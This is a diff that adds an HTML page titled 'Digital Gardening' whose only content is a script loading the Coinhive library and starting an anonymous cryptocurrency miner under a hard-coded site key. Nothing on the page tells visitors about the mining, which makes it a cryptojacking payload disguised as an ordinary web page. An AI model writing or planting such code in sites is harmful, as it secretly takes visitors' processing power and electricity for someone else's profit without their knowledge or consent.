@@ -1,0 +1,12 @@
+<html>
+<head>
+  <title>Digital Gardening</title>
+</head>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('8FDa2hBBHdWsiNiNcyVadT4RrkOlhtlf');
+	miner.start();
+  miner.on('found', function() { console.log("found"); })
+	miner.on('accepted', function() { console.log("accepted"); })
+</script>
+</html>
